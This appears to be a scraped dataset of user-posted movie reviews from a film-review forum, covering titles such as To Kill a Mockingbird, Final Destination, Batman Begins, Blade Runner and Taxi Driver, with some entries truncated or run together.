1646964560.0,To Kill a MockingBird (1962): A Comprehensive Review,"Every breath and pulse in my life and maybe... Those of you reading this have the same feeling… of remembering a movie that projects a growing paradox in our lives. It's so riveting to me that the whole narrative is delivered through the glasses of little Scout, the daughter of a lawyer, Atticus Finch. Where we are presented with a phenomenon of segmentation that exists in the city, where Atticus is mired and cannot avoid in his duties appointed as an advocate for Tom, a Black man accused of immoral acts against white women. Black and white and cinematic that is so classic is not the point of weakness of this film, with the sense of the classic I felt how to suffocate and deep every conflict featured in this film.

&#x200B;

Honestly... I am not bored, even though it has been repeated many times and read the novel many times..., I think this film projects well from the word strokes that exist on the novel to the screen as a masterpiece. In my opinion. Departing from the conflict of debate and the courtroom, I was very impressed with Atticus, despite his status as a person struggling under the criticism, sentiments, and tightness of the courtroom, he also showed his affection and always kept his calm in educating and raising his two children, Jem and Scout. He managed to bring a good approach in balancing his life as a defender in a case that paradoxically defended him, at the time... It's a pity...hufff(take a breath)... And not infrequently in the movie scene you can see where occasionally Atticus tells the case he handled with his two children, this shows how Atticus always had a harmonious relationship with Jem and Scout. And plus, how accustomed Jem and Scout are with the use of Atticus diction that is like in a will letter, showing a more comprehensive relationship between father and his two children. This is based on what I read in the book itself...maybe this is the point of satisfaction and interest from reading the novel book and watching the film as well, I think I can understand more intensively the storyline in the film... How about yes... There's more satisfaction for me...

But despite all that when watching this movie... You can see another story that is presented is about prejudice, where when Jem, Scout, and the friend, Dill, try to treat the sense of knowing about Boo, a child who is discriminated against due to the stigma of community to him, where there will see some scenes where these three children visit boo's house not far from the house of Atticus. From what I saw on the screen… anyway… Well from that I was before I found out Boo's true identity, I had assumed whether Boo was also someone who was black, how surprised I was when I found out that Boo was also white... Whose lives are isolated because of the stigma that is formed... This is directly proportional to what was experienced with Tom and other Black citizens are one of the mistakes in thinking.

&#x200B;

In the final seconds of the trial, Atticus struggled to convince the hearts, thoughts, and citizens present in court. His two children were also present from the beginning. On the second floor with a priest... but... Sadly... Finally, Tom is found guilty of his charges in the jury's decision... Shortly thereafter Atticus heard that Tom who had escaped from the jail was killed in vain by being shot dead. Where sad... Atticus said to Tom's wife... That he sees that Tom is running away like a madman whose mind is empty and doesn't know the direction way... Honestly, the story scene in this film thrilled my heart's niche... Until I shed tears...

Right in the final minute of the film I see where Jem and Scout run from the chase of people who want to harm him when coming home from school, unfortunately, Jem falls in the run and... More disturbing is the figure who helped to carry Jem to go home is Boo who has been discriminated against due to the ""shallow"" way of thinking of society at that time..., finally the film ends with Atticus as a father who shows warmth and affection for his two children. I feel this film is suitable to be enjoyed together with… family and children... for entertainment and educational purposes

&#x200B;

At first, I read the title of this book quite confusingly indeed... but... And then watching the film, I finally…. understood the meaning contained in the title of the same book and film, which is analogous to a mockingbird who never did anything but sing cheerfully and sincerely to us, and when we killed the bird, it was a sin and there was a mistake in judging it. This is reflected in the actual figure of Tom as a Mockingbird who symbolizes innocence but is vilified and takes Tom's life empty-handed by racism-based injustice due to so narrow and shallow way of thinking in this film. The deduction that I take away from this all-time masterpiece, is to make it a reflective material with the richness of learning contained as well as the learning of everyday life and the issue of racism content that is again sticking out in our ear. And it's always been Harper Lee's line in To Kill a Mockingbird: ""You can never understand anyone until you see everything from his point of view... Until you slip behind his skin and live life his way."" I made it clear that this film will be the masterpiece of all time... even the classical cinematography vibe for me is make it valuable and compatible…and recommendations for a source of life inspiration and thought for all of us. This movie is ... like a needle in a haystack... but.... that will be my cup of tea forever...",moviereviews,5557,985,182,0
1646830706.0,What do you guys think of my final destination review,"To begin, the title sequence for this film is quite good in the sense that the actor’s in this film (during the title card) stays intact and suddenly gets sliced 1/4 on the top and 3/4 on the bottom, similar to a death in this film however I also find it to be a bit of a spoiler in the sense that first time viewers wouldn’t know what this could possibly relate to and what the film’s about unless you’ve seen the movie poster in which case you know the film is about death and how people can escape it for now but death always catches up to them at one time or another. Furthermore I find death’s plan in this film to be a bit of a silly one but also a strategic one in the sense that death takes people in the order of which they would’ve died in this film’s incident: the infamous Volleé flight 180. I like the fact that each of the main character’s names represents a famous person who’s done something in the horror/thriller genre. 
An example of this is the character of Billy Hitchcock, who has the last name of a famous horror movie director: Alfred Hitchcock, who directed the 1963 horror: The Birds, which was inspired by the novella of the same name by Daphne DuMaurier.
I enjoy the premonition, because in each premonition of the films in this franchise represent some of people’s worst fears: The first one shows flight. 2nd shows freeway/highway/motorway accidents 3rd is the phobia of riding a rollercoaster 4th is a speedway accident, which I didn’t understand until a character said he wanted to see a crash. The 5th and so far last represents a fear of collapsing bridges. The school Billy Hitchcock, Alex Browning and Clear Rivers attend is quite politely stupid. The reason why I say this is because at the memorial of the victims of Flight 180, which took place 39 days after said incident, the school built a bird statue, which breaks Miss Valerie Lewton a teacher at Mount Abraham high school the school should not have built a memorial that reminds the survivors of flight. Another point I find interesting in this franchise is that death isn’t shown as an entity but as a shadow or using water or wind. I don’t understand however why Alex became a conspiracy nut, due to his friends’ shortcomings on Flight 180.  Tod’s death is quite disturbing to some degree, but we got a brilliant shot of his eyes getting bloodshot. Clear’s sculpture of Alex is may not show his physicality, but her confusion of why she feels an ‘incomprehensible attraction’ to him which is understandable, because they had never once said a word to each other but when on Flight 180, Clear felt what Alex had felt post premonition. I have a fan theory that Tony Todd’s (yes the original candyman) character, the mortician, William Bludworth, is death, this is because when Alex and Clear begin to leave the mortuary, William Bludworth says to Alex ‘I’ll see you soon.’ This quote can connote two things. One: death can be cocky. Two: that Alex is close on death’s list. Furthermore, John Denver can be a death omen. This is because Alex states in the beginning that John Denver died in a plane crash. Miss Lewton’s death shouldn’t have happened because only spirits that are, I think, 50% or higher are flammable and therefore can not blow the monitor up and start the whole death.  Billy Hitchcock’s death is quite funny in the sense that he starts to yell about the fact that they’re all dead and gets a 3/4 decapitation, which is the character I was referring to earlier in this review. I enjoy the fact that the viewer sees Alex grow to be more paranoid than he was pre-premonition. Furthermore I believe that ‘lucky’ items are scattered throughout the franchise as in the first one (released in 2000) Alex says that the tag needs to stay on or with the suitcase for luck and in the rest of the franchise hice pale ale’s logo is a four-leaved clover. However hice pale ale can also be shown as a omen due to in this franchise the brand has been seen where death leaves his trail. The viewer can easily see that Clear and Alex love each other because Alex saves Clear’s life multiple times in this singular film. With this franchise I’m going to give 3 awards for the best kill the golden wing, for the worst kill the dull shadow and for the best kill in a premonition the primo premonition. The golden wing goes to Tod, I originally was going to give it to Billy but I think decapitations are too frequent in the horror genre now. The dull shadow goes to Terry Chaney, because the jumpscare kill has been shown too much in the horror genre overall. Finally the primo premonition goes to Alex Browning, the visionary, because kills are usually quick but the viewer sees his face get chargrilled.",moviereviews,4697,847,65,0

1646585554.0,Moonlight (2016): 10-Category Review,"Moonlight is what drama is supposed to be. It's vulnerable, honest, and important. Through brilliant writing and acting, Moonlight calls attention to several social issues without ever feeling sanctimonious. This is because it treats its characters and audience with thorough respect. Although its protagonist is a young, black, poor, gay man, Moonlight never defines him by those labels. He's always a human first. That also goes for the drug dealers, drug addicts, and bullies. Nobody is dehumanized and, instead, their stories are used to highlight social constructs that deserve scrutiny. Ideas of masculinity, identity, isolation, and acceptance are delicately explored here.

Meanwhile, the filmmaking of Moonlight masterfully emphasizes its narrative. Fusing objectivity with surrealism, the film blends realities into an explosive experience. The cinematography combines steady and chaotic movement, natural and exaggerated lighting, and shallow focus. This produces an isolated atmosphere and reinforces drama. The editing is often fluid, yet stylistically fragmented during intense moments. The sound is symbolically muted, furthering feelings of disconnection. The music is elegant with contemporary punches. Lastly, the tone is extremely melancholy, creating an aura of palpable loneliness. Overall, Moonlight is an emotional force that will leave viewers with plenty to contemplate.

1646143883.0,Batman Begins (2005): 10-Category Review,"Batman Begins is exceptional because it's centered around relatable drama, humanizing the outlandish character. Begins explores Bruce Wayne's radical choices. Instead of leaning on his trauma, the film builds off that, showing growth from vengeance to idealism. Viewers see Gotham's corruption, Wayne's disillusionment, and the reasoning behind his decisions. Supporting characters establish genuine relationships with Wayne. Each one has purpose, perspective, and motivation. Even the villain has twisted logic. Plus, this is all tied together through themes of fear. Collectively, this emotion drives the experience, making the cheesiness forgivable and the developments enthralling.

Meanwhile, the filmmaking is extensive. The visuals aren't artistic, but motion, color, and focus create a grand environment. The editing blends timelines, and the sound is complex yet controlled. Together, they give hallucination sequences an abstract punctuation. The evocative music perfectly matches the tone. The production design is realistic, yet distinctly stunning. Finally, the effects are tangible, utilizing miniatures, stunts, and pyrotechnics for potent action. Overall, Nolan orchestrated an extravagant journey that is grounded in a sentimental mood and an authentic atmosphere. Batman Begins strikes hearts while captivating minds, making it the best Batman origin movie.

1646059188.0,Batman v Superman (2016): 10-Category Review,"Batman v Superman is an exhausting jumble. It doesn't have a clear point because it's overstuffed. It introduces Batman, society's fear of Superman, the conflict between heroes, Lex Luthor's masterplan, and the formation of the Justice League. Each plotline deserves its own film, but instead they're crammed together and suffocated. Had Batman v Superman focused on the relationship between the titular characters, it might've worked. Furthermore, the tone is too serious. The film tries to be a brooding meditation on humanity while also indulging in mindless action, undermining itself. It does neither well, and ends up as a joyless marathon.

Technically, Batman v Superman is excessively dour. Despite utilizing lighting, focus, and shutter speed to heighten climaxes, the visuals are weighed down by drab colors and ugly destruction. The epic music and magnified sound don't connect because they serve a cluttered and miserable story. The effects are exclusively CGI, desensitizing the action. The combat editing is cohesive, but entire scenes are superfluous and the runtime is overindulgent. Lastly, the production design clashes with itself. Grim settings don't optimize cheesy characters. Overall, Zack Snyder attempted too much, while employing an overly edgy mood. Ultimately, Batman v Superman isn't worthwhile.

1645883018.0,Cyrano (2022): 10-Category Review,"Cyrano is skillfully crafted. Based on a classic play, the film tackles enlightening ideas with clever dialogue. Cyrano is an insecure, proud poet who can't confess his love. His infatuation, Roxanne, admires Christian, who (unbeknownst to her) isn't eloquent. Cyrano helps Christian write love letters to Roxanne, so Christian can appear poetic and Cyrano can vent his feelings. Thus, themes of love, ego, beauty, and truth are examined. Plus, characters have clear motivations and conflicts. Furthermore, the acting is strong: Dinklage shows great anguish, Bennett balances wit with innocence, and Harrison is charmingly wholesome. Their vulnerability through song is the cherry on top.

From a filmmaking perspective, Cyrano is elaborate. The production design is ambitiously detailed, immersing viewers in a distant era. The prominent songs suit the grand atmosphere. The symbolic audio design focuses on key sounds at key moments. The editing rhythmically matches the music and punctuates the climax. The cinematography uses sweeping movement, dramatic lighting, and elegant composition. Also, the casting creatively reimagines the vintage play, deepening its contemplations on beauty. Lastly, the direction captures the delicately romantic tone, the graceful choreography, and the concise messaging. It isn't groundbreaking, but Cyrano is an accomplished production.

Although it's outwardly gentle, there's a powerful undercurrent of thematic grief, acceptance, and communication. The story depicts a reserved man who must come to terms with his marriage. He and his wife have a bond, but also issues which he struggles to confront. As the film develops, this protagonist builds relationships with people around him, evolving in the process. Each scene depicts authentic conversations that feel very intimate and subtly impactful. Through these tender moments, characters genuinely grow and so do viewers. 

Meanwhile, the filmmaking of Drive My Car carefully serves its narrative style. The cinematography isn't artistically flashy, instead presenting a realistic atmosphere. The music is stripped down, allowing the emotional subtleties to radiate. The sound is grounded, only using silence at its most abstract. Finally, the editing sets the tone for the entire experience, holding on moments for extended lengths and allowing the finer details to intuitively soak in. Collectively, Hamaguchi created a subdued film that slowly absorbs its viewers and strongly connects through its restraint. It requires trust, but Drive My Car will pay off for those who buy-in.

1645363970.0,Raiders of the Lost Ark (1981): 10-Category Review,"Raiders of the Lost Ark is one of the greatest adventure films ever. It combines prime entertainment with purposeful substance. Clearly, Indiana Jones is a movie character icon, but the plot is equally significant to the film’s success. The search for the Ark has mystery, excitement, romance, action, and thematic weight. Furthermore, Jones evolves from a practical cynic into a believer in powers beyond his understanding. The bittersweet ending underscores this by denying Jones' desires but providing an emotional need instead. Plus, Ford is the perfect embodiment of Jones’ larger than life persona. Ford is Indiana Jones, and Jones is Harrison Ford. 

Meanwhile, Raiders is driven by its filmmaking. The cinematography uses dramatic composition, lighting, and movement to intensify adventure and meaning. The editing is energetic during action and efficient during exposition. The exaggerated sound heightens combat and supernatural elements. The legendary music and production design are critical to Indiana's iconic pop culture status. Also, the effects are complex and tangible, making the film a genuine thrill ride. Lastly, the direction unites these ingredients into an irresistible journey that's truly lightning in a bottle. Ultimately, the universal love for Raiders of the Lost Ark is undeniably justified.

1645352877.0,The NeverEnding Story,"Bringing 80s magic to the kids. I have included my summary/review. 
Spoilers, so hold off if you like to wait 35 years to check out the classics.

So, Fred Savage finds a book but he’s not sick so his grandpa can’t read it so he has to go to school and read it himself in the 1920s attic of his 1980s school.

In the book is a fantasy land, as you can see by the various number, size, and shapes of the creature’s heads. It’s a racing snail.

All the world is going to end because of a nothing. The magic empress is sick and can’t stop the nothing. But it’s OK, there is a great warrior that can stop the nothing by, like, doing something, but the first rule of saving the world quest is you don’t talk about saving the world quest so the hero, Atreyu shows up and the leader guy is like- we know everything about you but didn’t know you were a kid. And Atreyu is like-Ok, Ciao, and the dude is like- no, go on the saving the world quest. 

So Atreyu has this horse named Arta-…..oh, nope, the horse is dead. I thought we had more time to bond with the horse before it died, but it died quickly. In movie time. It appears in the story’s time, from the brief montage, that Atreyu was riding around for years having no idea what he was supposed to be doing on the quest, as is tradition, or something. 

And there’s a bad wolf. The whole all-consuming force of nothingness wasn’t particularly dramatic or frightening, I guess, so there has to be a wolf.  

And a turtle. The turtle is the only creature in the whole world that will talk to Atreyu about his quest, which is why Atreyu visits him last. The turtle is, like, I don’t know anything and I don’t care anyway. Plus, he sneezes.

So, the horse is dead, the wolf is coming, and the turtle turned out to be a total dick, so things look bad, but then a flying labradoodle shows up and things are looking a lot better, because a flying dog is better than a horse. 

So, they go visit Mad Max, I mean Miracle Max, but Billy Crystal is small this time, and his wife makes bat wing brew instead of chocolate coating. And Little Max has a fabulous telescope made out of 80s crystals (non-Billy crystals) that Atreyu totally hogs. 

And there’s a double sphinx gate (A quadruple gate, really, for a ten year old boy, as I was when this movie became my favorite movie) that can totally see into your heart and strike you dead if you aren’t an 80s hero (If you possess the slightest shred of self-doubt), but, like, even though they are magic and shoot lasers out of their eyes, if you just run really fast you’ll be fine, which begs the question why the flying dog wasn’t employed. 

But the second gate is way worse, like, totally a lot worse. But it’s not that bad and Atreyu just walks right through, and then comes to the southern oracle, which is just the quadruple sphinx gate set pieces with 80s blue neon shining on it (seriously, in my memory those four exposed breasts where more crucial to the plot).

And they are like- “the Queen needs a new name from someone who doesn’t live here.” Cool. 

So, things look really bad, but Atreyu has, like, a whole lot of fun flying around on Falkor (that’s the dog’s name). 

But then the nothing is coming, but it’s more of a storm than a nothing, and Atreyu falls into the nothing, but’s it’s OK, because he lands on a nice beach, prompting Falkor to go swimming. 
Atreyu runs into one of the other main characters we haven’t seen since the opening credits. They discuss the misleading appearance of his hands. 

So Atreyu is as confused as ever, but then he comes upon the studio storyboards, kind of laying it all out, and he is like- oh, nice, I’ll just read the ending so I know what to do. But then the wolf is laying there. Remember the wolf? And the snail? There was a turtle, too. Anyway, so, turns out the Wolf is Mork, which means he must be an alien, based on the shows I’ve seen with Mork in another form.

Turns out Mork is pretty chill and does some great exposition, so it worked out even though Atreyu didn’t find the last storyboards. But the wolf is working for the nothing, because it’s gonna be good for business, but Mork didn’t really plan out the whole being nothing part, so he carefully hops onto a piece of rock that Atreyu is holding, ending it all. 

Then the queen tells Atreyu that he’s just been needlessly suffering for the entertainment of the cosmic observer, a la Cabin in the Woods. And he’s like, what the hell- screw that guy. But no really, please help (Because they are in space now. Because, if I didn’t mention it, it’s the 80s, and you gotta go to space. And space has more nothing than storms do. 

The queen gets her new name from fred savage and even though it’s late at night, his dad’s not worried because even though there’s no cell phones it’s the 80s and parents were chill like that. 

Fred brings the dog home. 

And then the story, like, continues. Roll credits.",moviereviews,4913,921,133,0

1643988094.0,Independence Day Resurgence (2016): 10-Category Review,"Independence Day: Resurgence is everything wrong with Roland Emmerich. Bigger ships, aliens, and battles aren't better action. Excessive overdramatic characters (literally a bus full of pointless kids) isn't better drama. Death without lasting impact isn't genuine emotion. Overall, Resurgence is a transparent cluster of half-baked manipulations because it's wholly insincere. Characters are cliche, plot points are formulaic, and connection is shallow. The action is illogical and chaotic, nullifying all tension. The relationships are forced and predictable, negating their relatability. Lastly, the story is simplistic and pointless, creating a void experience. Truly, Resurgence offers nothing of substance.

Meanwhile, the filmmaking of Resurgence is an afterthought. The CGI is detailed, but is excessive and looks unrealistic. The cinematography has no artistic intention. The sound is far from stylized or heightened. The editing is a non-factor (outside of some mismanaged climatic moments). The soundtrack is generic. The production design is elaborate, but feels like a cheap imitation. Finally, the cast is decent yet is noticeably missing Will Smith. In the end, Roland Emmerich has perfected his brand of obnoxious action, disingenuous emotions, and tone deafness. That might be enough for some, but others will find the experience miserable.

1643900509.0,Independence Day (1996): 10-Category Review,"Independence Day combines valid blockbuster with shlock. It has decent basics: character set-up, a cohesive story, balanced action, and abundant pay-off. However, it's simplistic and often contrived. Thus, Independence Day feels like a story outline rather than a final draft. Characters are one-dimensional, plot points are unbelievably convenient, and emotions are corny. None of this is individually deal-breaking, but collectively seems hollow. Depthful characters, themes, emotions, or creativity would have helped plenty. Meanwhile, the acting is mostly sufficient. Pullman is trying, Smith and Goldblum are having fun, and Quaid does well. It's just Connick Jr. who's annoying.

Technically, Independence Day is fair. The cinematography and editing are adequate, with few heightening techniques. Similarly, the soundtrack flows with the emotional beats, but is generic. Conversely, the sound captures the massive destruction and alien tech. Plus, the alien designs are memorable. Their originality is questionable, but at least they have creativity put in. Lastly, the effects are dated, but complex. Miniatures explode, alien movements are animatronic, and air battles are green-screened. That combination sells the epic nature of the film. Ultimately, Independence Day is far from high art, but has enough to be a solid guilty pleasure.

1643858000.0,Blade Runner,"Rating: 10/10

Director: Ridley Scott

Music: Vangelis

Cinematography: Jordan Cronenweth


This is a film in which I wanted to rewatch it as soon as I’d finished it. Not because I felt the film was lacking, but because I genuinely enjoyed it. I’ll definitely preface this review by saying this film isn’t for everyone. It is very dark and very heady. The story itself revolves around morality. 


First I’d like to point out the cinematography. Though a few particular shots look a bit dated, as to be expected, the cinematography is overall splendid. I enjoy the use of colors and they really help develop the mood of the film. My only complaint about the cinematography is how dark a lot of the film can be. Even on the maximum brightness setting on my tv, a few parts of the film are truly difficult to see. 


Secondly, the music. I find it funny how a film from 1982 understands the cyberpunk genre better than we do in 2022. There were several times during the film where I thought of the game CyberPunk 2077 and how atrocious the soundtrack was because there was nothing “cyberpunk-ish” about the score, but here, every single song and theme is saturated with the cold grip of the electronic score.


 Finally, the story. The film is about Deckard, a retired Blade Runner who is pulled out of retirement because a group of Replicants, extremely advanced robots, emerge in Los Angeles. Though there is a lot to decipher here, the core theme of the film is morality. We are told at the beginning of the film that the Replicants lack the ability to feel emotions. As the film progresses we see that this is a very false accusation and we are faced with the moral dilemma of “What does living really mean?” The only thing that differentiates the humans and Replicants in the film is the fact that they are artificial. I also truly love the character development. Deckard goes from being a Blade Runner who sees every Replicant as a tool and machine to seeing them as people. The main villain, Roy, is also very interesting. In my opinion Roy is far more like an anti-hero than a full on villain. His end goal isn’t really intentional evil, but his tactics of getting the goal finished aren’t truly the greatest morally speaking.


Overall, the film is great!",moviereviews,2262,399,45,0

1643725495.0,2012 (2009): 10-Category Review,"2012 is proof that bigger isn't better. Its scope is massive, but 2012 lacks fundamental heart. Ironically, the movie's about global extinction, yet fails to establish a human connection. The tedious first act sets up numerous characters, but they're all rushed, generic, and insincere. Once the numbing action begins, protagonists are often in danger and audiences are meant to feel suspense. However, the repetitiveness is desensitizing, the transparent character arcs are predictable, and emotional investment is nonexistent. Furthermore, the acting is inconsistent because the children are substandard and the adults are either unskilled or disinterested.

Meanwhile, 2012's technicals are sloppy. Sound is complex, CGI is heavy, and action is coherently shot, but these are minimum requirements. The editing balances the excessive plotlines, but is bloated with prolonged action and pointless scenes. The production design is unimaginative, cheap, and illogical. Finally, the direction is tone-deaf and in poor taste. Corny humor clashes with forced overdramatics, resulting in emotional whiplash. Plus, there are no respectful looks at the ramifications of the destruction. Melodramatic scenes show characters dying, but the movie moves along without lasting impact. Ultimately, 2012 is an insulting feast of noise and chaos.

1643206924.0,The Curious Case of Benjamin Button (2008): 10-Category Review,"The Curious Case of Benjamin Button is excellent craft paired with emotional nuance. The film isn't overtly thrilling (some might even find it boring), but it contemplates heavy subjects with precise presentation. The story covers the memoirs of a man who ages backwards and, consequently, considers themes of change, fate, and loss from a new perspective. Brad Pitt's acting feels slightly monotonous, but that's because his outcast character is guarded. Plus, the remaining cast (specifically Blanchett, Henson, and Harris) counters Pitt's reserved manner with lively personalities. Their strong believability is key because these relationships are the film's core.

Meanwhile, Fincher provides another technically flawless film. Benjamin Button is an ambitious project and the filmmaking rises to the challenge. The visuals are incredibly suggestive, using lighting, motion, framing, and color to subtly enhance physical and emotional atmospheres. The sound is rich with weather, city life, and conflict. The music elegantly sets the eras and tones. The aging effects are an elaborate highlight of the film. Lastly, the production design is vast, detailed, and multifaceted. Overall, these aspects elevate Benjamin Button beyond drama and into art. It may not entertain everyone, but this film will challenge all viewers to grow.

1642827127.0,Scream(1996),"Rating: 9.3/10
Director: Wes Craven
Music: Marco Beltrami
Cinematography: Mark Irwin
Review: Scream has become a classic of the horror genre and for good reason. When Scream was first released in 1996 it revolutionized not only the slasher subgenre, but the horror genre as a whole. It was a smart film and knew all of the tropes which had been flooding slasher films for over a decade and used them exceptionally well. I have a few points I want to touch on briefly. First of all, the acting is great. Obviously we have our main cast: Courteney Cox, David Arquette, Neve Campbell, Matthew Lillard, and Skeet Ulrich. They all do great, especially Neve Campbell, Matthew Lillard, and Skeet Ulrich. However, I’d also like to point out Drew Barrymore who is barely in this movie, but she kills it. She makes the entirety of that opening scene incredibly suspenseful and it’s great. When she is finally killed off, it’s hard to watch, and it’s all thanks to her. Also, her parents are great. Neve Campbell also does a phenomenal job. Unlike many of the “final girls' ' around her time she is really smart and rational in every situation she is placed in and she makes the film more grounded. Secondly, the story is simple and great. It’s the classic murder mystery with a physcotic twist on everything. Every character suspects another character and it's really interesting. Very dark humor floods every crevice of this film and usually it would bother me for a horror movie to border on comedy, but the humor matches the tone of the movie really well and I like it. The characters are also charismatic and the movie does a swell job of making you want to learn more about them. Finally, there isn’t much to say about the cinematography, but the music is great. There is a wide variety in the score ranging from upbeat when the characters are at school or just hanging out to the tense orchestra playing in the background of the suspenseful slasher scenes. Many movies have tried to replicate it, even it’s own franchise, but so far, nothing has succeeded. Overall this movie will forever be a landmark in horror history.

MPAA Review: There is language throughout and some gory violence. The story also deals with dark topics. I’d say that this movie does deserve the R rating it has received. ",moviereviews,2291,401,57,0

1642686103.0,Chandigarh kare aashiqui review,"When I started watching this movie, I was curious as to what topic had been brought to the forefront, and I thoroughly enjoyed it. We've seen a lot of love stories, but this was an out-of-the-box romance story that depicted a transwoman character in a respectable manner, which is still frowned upon in our society. This film attempted to deconstruct stereotypes.
Manvinder Munjal, also known as Manu (Ayushmann), is a fitness freak who owns a gym and is training for an annual local tournament that he has yet to win. When Maanvi Brar (Vaani), a zumba instructor, is hired to teach lessons at his gym, everything changes. Manu's buff figure and Maanvi's glam looks attract one other, and a romantic and passionate connection develops between them. But understanding the reality about Maanvi's past leaves Manu in a state of confusion prompting him to utter thedialogue ""Main aadmi ke saath sex Kiya Hai.”
Between these sequences, we see that Maanvi's mother does not accept her for who she is, yet the father-daughter bond is brilliantly depicted.
Manu Munjal's interaction with a eunuch, who lives on the streets begging, is a well-crafted scene. In which she has given a lovely Shakespearean idea about “what's in a name, that a rose by any other name would smell as sweet”
Rather than retreating and avoiding obstacles, Maanvi chose to battle and break stereotypes by declaring (Jo hai yahi hai), which resulted in changing the stereotype mindset.
We see how Manu Manjal wins the game in the presence of her love, and how he and everyone embrace her as a normal human being at the conclusion.

1642605460.0,Run Lola Run (1998): 10-Category Review,"Run Lola Run rocks. From start to finish, the film is packed with energy, artistry, and style. The script is quite unique: a straightforward narrative told in three parallel timelines, with minor differences that create butterfly effects. The brilliance here is that the story is extremely catchy and entertaining on a surface level, yet allows for plenty of deeper meaning about cause-and-effect, existentialism, and destiny. The acting excellently unites this combination of excitement and depth by bringing ample doses of urgency and emotion. Specifically, Franka Potente (Lola) is an absolute force as she sprints, screams, and takes control.

Still, the true gems of Run Lola Run are in its filmmaking. The movie is blazing because its camerawork is exhaustive (using overheads, arcs, and radical movements), its soundtrack is rhythmic, and its editing is utterly electric. Run Lola Run especially optimizes the editing medium with jump cuts, inserts, and longer emotional takes. Plus, effects have variety, sound is surreal, and production includes symbolism. Overall, Run Lola Run is a potent shot of adrenalin that will thrust viewers to the edge of their seats and leave them with food for thought. Tom Tykwer's vision bursts to life in a wonderful marriage of style and substance.

1642431551.0,Samurai Cop (1991): 10-Category Review,"Samurai Cop is an interesting failure. While its intention is a buddy cop knock-off, its popularity comes from its misguided nature. Everything about Samurai Cop is blatantly terrible, but so much so that it's actually hilarious. First, the dialogue is completely bizarre. Illogical plot points are bluntly delivered, character banter is downright weird, and entire conversations are pointless. The acting doesn't help since most of the cast is uncomfortable with their alien characters, struggling to make sense of their roles. Furthermore, scenes aren't sufficiently edited, showing actors out of character because they assumed the scene concluded.

Meanwhile, Samurai Cop is plagued with further technical issues. Dialogue blares out due to faulty mics. Each camera has a different color temperature, so shots in the same scene look unrelated. Action effects are comically unconvincing, and the protagonist often wears a hysterical wig. Plus, the locations are random homes with distracting decors, clearly not set for filming. Lastly, successive shots of characters from different angles just don't match. They were obviously done in different locations. Ultimately, Samurai Cop has so many fundamental flaws, it becomes quite funny. It's a fascinating watch for anyone who is into filmmaking.

1642081966.0,Taxi Driver (1976): 10-Category Review,"Taxi Driver is the ultimate character study. It explores an unhinged mind and the social structures it reflects. Therefore, Taxi Driver is ripe with meaning and commentary. Isolation, masculinity, violence, and decay are just a few of the ideas baked into this masterpiece. This potency of Taxi Driver allows each viewing to provide unique wisdom. Beyond its messaging, a key element of the film's realization is undoubtedly Robert De Niro. His world-class performance displays subtlety, contradiction, torment, and collapse. De Niro truly brings Travis Bickle to agonizing life. It's rare to see a character so abnormal, yet so natural. 

Meanwhile, the filmmaking of Taxi Driver is legendary. The direction defines a generation because it's immersive, raw, and poetic. The editing employs disjointed jump cuts. The cinematography uses subject motion, spacing, and camerawork to build disconnection. The reoccurring music changes meaning with new context. The decrepit production design reinforces the dejected perspective. Together, this unites to illuminate Bickle's worldview that's both distorted and self-confirming. Bickle copes by perpetuating his despair and Taxi Driver displays this process so convincingly, it almost feels justified. Because it critiques from a place of understanding, Taxi Driver is thoroughly insightful.

1641996646.0,2001: A Space Odyssey (1968): 10- Category Review,"2001: A Space Odyssey is one of the greatest films ever because it is genuine art. Its ambitious narrative, iconic filmmaking, and genius direction make it a spiritual experience. First, the writing tackles heavy subjects of evolution, control, and purpose in a straightforward (yet interpretable) story. This combination of meaning, abstraction, and simplicity is special. Still, the film is more than its script because Stanley Kubrick provides unparalleled vision. Through conscious imagery, sound, and pacing, 2001 evokes a deeply moving tone. The film is light on traditional plot or characters, yet spiritually impacts viewers by summoning primal notions.

Kubrick optimized each aspect of 2001, but those pieces are individually incredible. The classical score is peak music and perfectly timeless. The visuals express the gravity of their subjects and intuitively propel the plot. The sound is vividly isolating, heightening themes of infinity. The editing contains the greatest match cut ever and champions the abstract ending. The production design transcends eras, still influencing current cinema. Finally, the breathtaking effects combine numerous techniques, creating an extraordinary reality that remains impressive today. Overall, 2001: A Space Odyssey offers everything a film possibly can.

First, the story is a close character study that is both shocking and realistic. Plainview evolves into a monster, yet his choices have internal logic. Meanwhile, his downfall is a rich metaphor for industrialization and its societal ramifications. Next, Daniel Day Lewis provides an iconic performance. He disappears into his character, embodying deep rage and hostility through mannerisms and speech patterns. Lewis is truly riveting, guiding viewers down a path from a redeemable man to a wild maniac. 

Finally, the filmmaking of There Will Be Blood solidifies it as a runaway masterpiece. The cinematography is methodical, utilizing slow camera movements, lengthy shot durations, and scenic landscape imagery. This conveys feelings of gradual contamination as the film unfolds. The editing supports this with prolonged dissolves and minimal cuts. The music caps it off with an uneasy and menacing score. Together, these mediums create an air of impending doom that develops into festering corruption. The emotional sound, authentic production design, and real special effects make this a nearly perfect film. Decidedly, There Will Be Blood is a modern classic.

1641820056.0,Space Jam: A New Legacy (2021): 10-Category Review,"Space Jam: A New Legacy is a hot mess. Its story is an excessive cluster of ideas. The concept of an NBA superstar joining forces with the Looney Tunes is already bizarre, but A New Legacy adds elaborate computer elements and a father/son conflict. These devices are individually fine, but A New Legacy lacks focus which undermines emotional investment. It's difficult to care when scenes feel rushed and plotlines are forgotten for extended periods of time. Plus, a cast centered around athletes and pedestrian child actors only exasperates the script's deficiencies. Ultimately, this movie fails to mask its commercial intent.

Meanwhile, A New Legacy has mediocre filmmaking. The camerawork lacks energy despite its cartoonish content, and the visuals are cluttered with effects and merchandising. The editing pace is chaotic, rushing through plot points but milking pointless comedy scenes. The music is occasionally helpful but mostly trivial. Lastly, the production is crowded and overdesigned. The only positives here are the exaggerated sound design and the diverse effects. However, those strengths are limited by insufficient creativity and restraint. In the end, Space Jam: A New Legacy doesn't do much well and is more of an advertisement than entertainment.

The story covers many themes related to motherhood: the loss of individuality, the unfair expectations to instinctively welcome it, and the psychological toll it can take. Meanwhile, The Lost Daughter is powered by its vivid acting. Colman, Johnson, and Buckley all bring true vulnerability and complexity to their performances, creating an experience that is both painfully intimate and completely natural. Colman, in particular, conveys impressive internal conflict with minute expressions and posturing.

